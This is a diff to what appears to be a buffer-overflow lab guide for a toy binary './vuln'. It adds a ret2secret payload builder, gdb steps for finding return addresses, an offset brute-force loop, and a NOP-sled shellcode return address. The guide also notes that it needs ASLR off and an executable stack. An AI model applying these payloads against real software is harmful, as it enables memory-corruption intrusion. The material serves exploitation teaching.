@@ -150,9 +150,56 @@ or:
 for i in $(seq 60 78); do
   echo "Trying offset: $i"
   python -c "print 'A'*$i + '\x74\x86\x04\x08'" > payload
-  ./vuln < payload && echo "💥 Success at offset $i!"
+  ./vuln < payload && echo "Success at offset $i!"
 done
 ```
+
+### ✅ More Stable `ret2secret` Payload (Recommended)
+
+If you see `Illegal instruction`, `Segmentation fault`, or `Floating point exception` *after* your
+success message, the overwrite likely worked, but `secret()` returned to an invalid address.
+
+Use a second return address after `secret()`.
+
+```bash
+gdb ./vuln
+```
+
+In `gdb`:
+
+```gdb
+disassemble main
+```
+
+Example:
+
+```text
+0x0804870c <+6>:  call   0x80486ac <vulnerable>
+0x08048711 <+11>: mov    $0x0,%eax
+```
+
+Use the instruction immediately after `call vulnerable` as `after` (here: `0x08048711`).
+
+Then build:
+
+```bash
+python - <<'PY'
+import struct
+secret = 0x08048674   # from gdb: p/x secret
+after  = 0x08048711   # from gdb: next instruction after call vulnerable
+payload = b"A"*76 + struct.pack("<I", secret) + struct.pack("<I", after)
+open("payload_ret2secret", "wb").write(payload)
+print("Wrote payload_ret2secret")
+PY
+```
+
+Run:
+
+```bash
+./vuln < payload_ret2secret
+```
+
+This usually preserves control flow better than a single overwritten return address.
 
 
 Run the attack:
@@ -161,7 +208,8 @@ Run the attack:
 ./vuln < payload
 ```
 
-💡 If successful: you get a shell!
+💡 For this lab, success means execution is redirected into `secret()`.  
+Getting an interactive shell depends on environment details and may still crash afterward.
 
 ---
 
@@ -187,7 +235,15 @@ shellcode = (
 )
 buf_to_ret = 76
 nop_sled = b"\x90" * 24
-ret_addr = b"\x90\xf0\xff\xbf"  # RET_ADDR example only
+# RET_ADDR
+# gdb ./vuln
+# break vulnerable
+# run
+#print &buffer
+#(gdb) print &buffer
+# $1 = (char (*)[64]) 0xff914960
+# If little-endian use: b"\x60\x49\x91\xff"   
+ret_addr = b"\x60\x49\x91\xff"  
 body = nop_sled + shellcode
 if len(body) > buf_to_ret:
     raise SystemExit("Shellcode + NOP sled too large for current offset")
@@ -204,6 +260,7 @@ Run:
 ```
 
 Note: this only works reliably in the lab setup (e.g., `-z execstack`, ASLR off, and correct return address).
+If you see unstable behavior across runs, verify ASLR is actually disabled in your environment.
 
 ---
 
